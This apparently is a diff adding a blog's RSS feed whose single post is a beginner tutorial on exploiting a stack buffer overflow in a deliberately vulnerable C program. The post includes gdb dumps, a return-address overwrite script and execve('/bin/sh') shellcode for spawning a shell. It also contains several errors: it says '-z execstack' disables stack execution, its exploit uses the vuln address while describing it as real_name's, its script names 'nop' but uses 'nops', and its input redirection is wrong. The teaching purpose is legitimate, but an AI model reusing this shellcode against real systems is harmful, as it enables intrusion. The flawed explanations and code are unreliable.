@@ -1,0 +1,232 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Posts on Darccau</title>
+        <link>https://darccau.github.io/posts/</link>
+        <description>Recent content in Posts on Darccau</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-GB</language>
+        <copyright>&lt;a href=&#39;https://creativecommons.org/licenses/by/4.0/&#39; target=&#39;_blank&#39;&gt;CC-BY 4.0&lt;/a&gt;</copyright>
+        <lastBuildDate>Mon, 10 Aug 2020 20:03:02 -0300</lastBuildDate>
+        <atom:link href="https://darccau.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Buffer Overflow Exploitation</title>
+            <link>https://darccau.github.io/buffer-overflow-exploitation/</link>
+            <pubDate>Mon, 10 Aug 2020 20:03:02 -0300</pubDate>
+            
+            <guid>https://darccau.github.io/buffer-overflow-exploitation/</guid>
+            <description>Introduction Briefly, the buffer overflow is a vulnerability that occurs when a program writes more data than its buffer supports. And the data that exceeds the buffer size overwrite the program information.
+For explain this vulnerability, i was prepered this vulnerable C code as you can see below.
+#include &amp;lt;stdio.h&amp;gt; void vuln(void) { char name[30]; puts(&amp;#34;Whats my name? &amp;#34;); scanf(&amp;#34;%s&amp;#34;, name); printf(&amp;#34;You say: %s\nBut it is not my real name!&amp;#34;, name); } void real_name() { puts(&amp;#34;You are right, my name is Eduardo&amp;#34;); } int main(void) { vuln(); return 0; } Now we need to compile this program, some flags will be used to disable some file protections:</description>
+            <content type="html"><![CDATA[<h3 id="introduction">Introduction</h3>
+<p>Briefly, the buffer overflow is a vulnerability that occurs when a program writes more data than its buffer supports. And the data that exceeds the buffer size overwrite the program information.</p>
+<p>For explain this vulnerability, i was prepered this vulnerable C code as you can see below.</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">#include &lt;stdio.h&gt;
+
+
+void vuln(void) 
+{
+    char name[30];
+
+    puts(&#34;Whats my name? &#34;);
+    scanf(&#34;%s&#34;, name);
+    printf(&#34;You say: %s\nBut it is not my real name!&#34;, name);
+}
+
+void real_name() 
+{
+    puts(&#34;You are right, my name is Eduardo&#34;);
+}
+
+
+int main(void) 
+{
+
+        vuln();
+
+        return 0;
+}
+</code></pre></div><p>Now we need to compile this program, some flags will be used to disable some file protections:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">gcc vulnerable.c -o vulnerable -z -execstack -fno-stack-protector -no-pie -w
+</code></pre></div><p>Brief explain about the flags:</p>
+<ul>
+<li><strong>execstack:</strong> Disable execution on the stack.</li>
+<li><strong>fno-stack-protector:</strong> Remove the stack cookie.</li>
+<li><strong>no-pie:</strong> Disables memory randomization.</li>
+</ul>
+<p>That done, we have an executable file called &ldquo;vulnerable&rdquo;.</p>
+<p>The behavior of &ldquo;vulnerable&rdquo; is basically to print a message, get an input and print this input. This is illustrated below.
+<strong>Execution</strong></p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">~$ ./vulnerable
+</code></pre></div><p><strong>Output</strong></p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Whats my name?
+AAAAAAAA
+You say: AAAAAAAA
+But it is not my real name!
+</code></pre></div><p>But, when this input is bigger than expected we got:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Whats my name?
+You say: AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHH
+[1]    9337 segmentation fault (core dumped)  ./vulnerable
+</code></pre></div><p>Voilà, we got an unexpected behaviour.</p>
+<p>We dont go deeper in assembly or computer architecture, but we need to understand a bit to comprehend and exploit this flaw. Bellow  I will explain some of the concepts necessary for this purpose.</p>
+<h4 id="stack">Stack</h4>
+<p>It is a piece of memory that stores among other things the variables of a program. This content is managed following the FILO rule (the first to enter is the last to leave). The operations that control the insertion and removal of the content present in the stack, are respectively push and pop.</p>
+<h4 id="registers">Registers</h4>
+<p><strong>rip</strong>: The rip(Instruction pointer) is an register that is responsible for execute the next instruction of code.</p>
+<p><strong>rsp</strong>: The rsp(Stack pointer) is an register that commonly apoint to the top of stack</p>
+<p><strong>rbp</strong>: The rbp(Base pointer) register define the base of stack frame, it means the space reserved in stack to store variables.</p>
+<h4 id="assembly-instructions">Assembly Instructions</h4>
+<p><strong>call</strong>: As a C function when called, this instruction goes to the address / label specified after its declaration. But not only that. when a function is called, it needs to return to its old scope for the program to end normally. Therefore, the address after the function call is stored in the stack, so that, at the end of the function, this address is at the top of the stack and it is possible to return this address to the register responsible for executing the program instructions (rip) so that the program continues its normal execution flow.</p>
+<p><strong>ret</strong>: An assembly instruction that takes the address at the top of the stack and places it in the rip.</p>
+<p>Now come to gdb, to understand the behavior of the program</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">gdb vulnerable
+</code></pre></div><p>In console type:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">disassemble vuln
+                            [ Disassemble main function ]
+
+        0x00000000004011d8 &lt;+0&gt;:     endbr64
+        0x00000000004011dc &lt;+4&gt;:     push   rbp
+        0x00000000004011dd &lt;+5&gt;:     mov    rbp,rsp
+        0x00000000004011e0 &lt;+8&gt;:     call   0x401176 &lt;vuln&gt;
+        0x00000000004011e5 &lt;+13&gt;:    mov    eax,0x0
+        0x00000000004011ea &lt;+18&gt;:    pop    rbp
+        0x00000000004011eb &lt;+19&gt;:    ret
+</code></pre></div><p>With this command, we obtained the assembly code for the &ldquo;main&rdquo; function. we can see that vuln function are called.</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">run
+                                [  Run program ]
+
+        Whats my name?
+        AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHH
+        You say: AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHH
+        
+        Program received signal SIGSEGV, Segmentation fault.
+</code></pre></div><p>With this assert the program was executed in gdb context, in this exemple we will reproduce the unexpected behavior as before.</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">x/15gx $rsp
+                                  [ Print STACK ]
+
+        0x7fffffffd8f8: 0x4646464646464646      0x4747474747474747
+        0x7fffffffd908: 0x4848484848484848      0x00007ffff7ffc600
+        0x7fffffffd918: 0x00007fffffffd9f8      0x0000000100000000
+        0x7fffffffd928: 0x00000000004011d8      0x00000000004011f0
+        0x7fffffffd938: 0xed880c701a08a9b0      0x0000000000401090
+
+
+x/gx $rsp
+                [ Top address of STACK ]
+        0x7fffffffd8f8: 0x4646464646464646
+</code></pre></div><p>It is the dumping of part of the top of stack&rsquo;s. we can see that part of them are filled in by &ldquo;46, 47, 48&rdquo;. This represents part of the input sent to the program. But, these values are different from &ldquo;ABCDEFGH&rdquo; right? yes, but computationally, the letters are represented by numbers, we can verify when we look at the ascii table.</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">~$ man ascii
+</code></pre></div><table>
+<thead>
+<tr>
+<th>Oct</th>
+<th>Dec</th>
+<th>Hex</th>
+<th>Char</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>101</td>
+<td>65</td>
+<td>41</td>
+<td>A</td>
+</tr>
+<tr>
+<td>102</td>
+<td>66</td>
+<td>42</td>
+<td>B</td>
+</tr>
+<tr>
+<td>103</td>
+<td>67</td>
+<td>43</td>
+<td>C</td>
+</tr>
+<tr>
+<td>104</td>
+<td>68</td>
+<td>44</td>
+<td>D</td>
+</tr>
+<tr>
+<td>105</td>
+<td>69</td>
+<td>45</td>
+<td>E</td>
+</tr>
+<tr>
+<td>106</td>
+<td>70</td>
+<td>46</td>
+<td>F</td>
+</tr>
+<tr>
+<td>107</td>
+<td>71</td>
+<td>47</td>
+<td>G</td>
+</tr>
+<tr>
+<td>110</td>
+<td>72</td>
+<td>48</td>
+<td>H</td>
+</tr>
+</tbody>
+</table>
+<p>Comparing the table with the memory dump, is possible assert that part of the imput in hexadecimal is stored on stack. Considering that, and what we was learn about assembly and computer arquitechtures. we got that, the payload overwirete the top of stack, it means that rsp regiter appoint to 0x4646464646464646 what will make rip got an invalid memory adress and the message segmentfault is show.</p>
+<p>This illustration below show the stage of stack in normal flow.</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">                                      [STACK]
+                Top of stack:    |return adress|  &lt;- rsp
+                                 |     ...     |  
+                                 |   name[50]  |  &lt;- rbp
+                                 |     ...     | 
+</code></pre></div><p>When the ret instruction will be executed the &ldquo;return adress&rdquo; that represent the addres of &ldquo;return&rdquo; in the C used exemple will be put in the rip that will come back to main function and correctly finish the program.</p>
+<p>This represent the stack when the overflow was happen.</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">                                        [STACK]
+                Top of stack:    |0x4444444444444444|  &lt;- rsp
+                                 |0x4343434343434343|  
+                                 |0x4242424242424242|
+                                 |0x4141414141414141|  &lt;- rbp
+                                 |        ...       |  
+
+</code></pre></div><p>Now remenber what will happen when the <strong>ret</strong> register will be executed, they will get the top address of the stack and will put it into <strong>rip</strong> to program follow the normal flow, but when the top address of stack is overwrited, the <strong>rip</strong> will recive the overwrite value in the above example (0x44444444), but it&rsquo;s an invalid address and the return a segmentfault fault message.</p>
+<p>But it is not the central problem, its behavior can be much more harmful than just crashing the application, if you can overwrite the address on the top of stack when the program are running the program will be able to take control of the program&rsquo;s execution flow, it may be possible to execute other parts of the code or arbitrarily execute commands, I will give examples.</p>
+<p>At first, we will change the execution flow of the program to execute &ldquo;real_name&rdquo; funtion. Instead, you replace the address on the top of stack in the end of &ldquo;vuln&rdquo; execution it means the address of &ldquo;return&rdquo; in C example, to letters or some other junk, we will put an valid address, like the &ldquo;real_name&rdquo; function, in the code example.</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Exploit.py
+</code></pre></div><div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">padding = &#34;A&#34; * 72
+overwirete_return_address = &#34;\x76\x11\x40\00\00\00\00\00&#34;
+print(padding + overwirete_return_address)
+</code></pre></div><p>Padding is the ammount of content that overwrite the buffer until before of top of stack.</p>
+<p>This &ldquo;overwirete_return_address&rdquo; represent the address that start the target function that we want to be executed(real_name), its possible find this address in objdump with:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">objdump -M intel -d vulnerable | grep -m 2 vuln
+</code></pre></div><p><strong>Output</strong></p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">vulnerable:
+0000000000401176 &lt;vuln&gt;:
+</code></pre></div><p>Note that is necessary put the address in bakwards because of the processor follow the little endian notation.</p>
+<p><strong>Execution</strong></p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$HOME/file_path/vulnerable &lt; python2 exploit.py
+</code></pre></div><p><strong>Output</strong></p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Give me some input:
+You say: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@
+You are right, my name is Eduardo
+[1]    7836 segmentation fault (core dumped)
+</code></pre></div><p>The &ldquo;real_name&rdquo; did executed, but the danger can be amplified if you put an shellcode it means amount machine code instruction that return execute <em><strong>/bin/bash</strong></em> and you can take a shell in target machine. so go build the exploit.</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">padding = &#34;A&#34; * 72
+
+overwrite_return_address = &#34;Previous address to top stack&#34;
+
+nop = &#34;\\x90&#34; * 60
+
+shellcode = &#39;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&#39;
+
+print(padding + overwrite_return_address + nops + shellcode)
+</code></pre></div><p>This exploit i was make some modifications, now, the override_return_address represent de address after the overwrite address in stack, that will repoainto to stack segment, and remenber, we compile this binary with NX(no execstack) protection it means that stack can execute intructions. use the nop instructions, that make anything, to avoid stack unalligment problems(I pretend talk about it in another post).</p>
+<p>If all happened following the plain, the signal &ldquo;#&rdquo; or &ldquo;$&rdquo; in the terminal has been disaper. And you are a new shell.</p>
+]]></content>
+        </item>
+        
+    </channel>
+</rss>
